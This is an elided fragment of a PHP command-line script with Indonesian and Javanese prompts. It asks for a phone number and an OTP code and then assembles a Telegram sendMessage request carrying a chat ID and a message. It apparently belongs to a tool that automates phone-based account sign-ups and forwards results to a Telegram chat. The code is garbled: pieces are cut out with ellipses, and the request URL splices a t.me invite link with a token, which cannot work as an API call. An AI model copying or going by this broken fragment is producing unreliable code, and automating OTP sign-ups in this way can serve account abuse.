...
echo color("white","                  Format Input Kudu 62*** Bla Bla \n");
        ...
        echo color("white"," KODE OTP COK..")."\n";
        otp:
        echo color("white"," Otp Lebokno : ");
	...
	$method	= "sendMessage";
	$url    = "https://t.me/joinchat/AAAAAFVfavKNBHNNrPmMQg" . $TOKEN . "/". $method;
	$post = [
 		'chat_id' => $chatid,
                'text' => $pesan
        	];
